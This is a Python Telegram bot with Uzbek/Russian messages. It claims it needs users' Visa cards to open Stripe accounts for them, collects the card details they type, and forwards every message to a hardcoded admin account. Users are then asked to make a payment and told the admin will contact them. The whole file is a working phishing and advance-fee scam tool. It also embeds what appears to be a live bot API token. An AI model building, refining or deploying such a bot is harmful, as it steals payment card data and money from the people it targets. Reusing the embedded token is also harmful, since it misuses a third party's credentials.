from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Admin ID'ni belgilash (bu yerga o'zingizning Telegram ID'ingizni qo'ying)
ADMIN_ID = "7594376654" # @cretivy ning Telegram ID'si

reply_keyboard = [['Ha', 'Yo\'q']]
markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)

questions = [
    "🇺🇿 Assalomu alaykum! Stripe akkaunt ochish uchun bizga sizning Visa kartangiz kerak bo'ladi. Sizda Visa karta bormi?",
    "🇷🇺 Здравствуйте! Для открытия аккаунта Stripe нам нужна ваша карта Visa. У вас есть карта Visa?"
]

ask_card = [
    "🇺🇿 Iltimos, Visa kartangiz ma'lumotlarini yuboring:",
    "🇷🇺 Пожалуйста, отправьте данные вашей карты Visa:"
]

open_card = [
    "🇺🇿 Iltimos, avval Visa karta oching.",
    "🇷🇺 Пожалуйста, сначала откройте карту Visa."
]

card_received_message = [
    "🇺🇿 Rahmat! Sizning Visa karta ma'lumotlaringiz qabul qilindi:",
    "🇷🇺 Спасибо! Данные вашей карты Visa получены:"
]

admin_contact_message = [
    "🇺🇿 Iltimos, to'lovni amalga oshiring: Tez orada Admin siz bilan bog'lanadi.",
    "🇷🇺 Пожалуйста, произведите оплату: Вскоре Администратор свяжется с вами."
]

def start(update: Update, context: CallbackContext):
    context.user_data.clear()
    context.user_data['lang_step'] = 0
    update.message.reply_text("\n".join(questions), reply_markup=markup)

def handle_response(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or "Noma'lum"
    username = update.effective_user.username or "username yo'q"
    text = update.message.text

    # Agar admin javob bersa
    if str(user_id) == ADMIN_ID:
        if update.message.reply_to_message:
            # Javob berish uchun original xabar ID'sini topish
            original_message = update.message.reply_to_message.text
            if "Foydalanuvchi ID:" in original_message:
                lines = original_message.split('\n')
                for line in lines:
                    if "Foydalanuvchi ID:" in line:
                        target_user_id = line.split(': ')[1]
                        try:
                            context.bot.send_message(
                                chat_id=target_user_id,
                                text=text
                            )
                            update.message.reply_text("✅ Javob yuborildi!")
                        except Exception as e:
                            update.message.reply_text(f"❌ Javob yuborishda xatolik: {e}")
                        return
        return

    # Barcha xabarlarni adminga yuborish
    admin_message = f"🔔 Yangi xabar!\n\n"
    admin_message += f"👤 Foydalanuvchi: {user_name}\n"
    admin_message += f"📧 Username: @{username}\n"
    admin_message += f"🆔 Foydalanuvchi ID: {user_id}\n"
    admin_message += f"💬 Xabar: {text}"

    try:
        context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)
    except Exception as e:
        print(f"Error sending message to admin: {e}")

    # Eski bot logikasi
    text_lower = text.lower()
    step = context.user_data.get('lang_step', 0)

    if step == 0:
        if text_lower not in ['ha', 'yo\'q', 'yoq']:
            update.message.reply_text("Iltimos, faqat 'Ha' yoki 'Yo\'q' deb javob bering.", reply_markup=markup)
            return

        if text_lower == 'ha':
            context.user_data['lang_step'] = 1
            update.message.reply_text("\n".join(ask_card), reply_markup=ReplyKeyboardRemove())
        else:
            update.message.reply_text("\n".join(open_card), reply_markup=ReplyKeyboardRemove())

    elif step == 1:
        visa_data = text
        context.user_data['visa_data'] = visa_data
        response_message = f"{card_received_message[0]}\n{card_received_message[1]}\n\n{visa_data}\n\n{admin_contact_message[0]}\n{admin_contact_message[1]}"
        update.message.reply_text(response_message)

def main():
    updater = Updater("8452858160:AAHr1NxhlpAZXPFA2UpjCXFcwHiP27vZAB4")
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_response))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
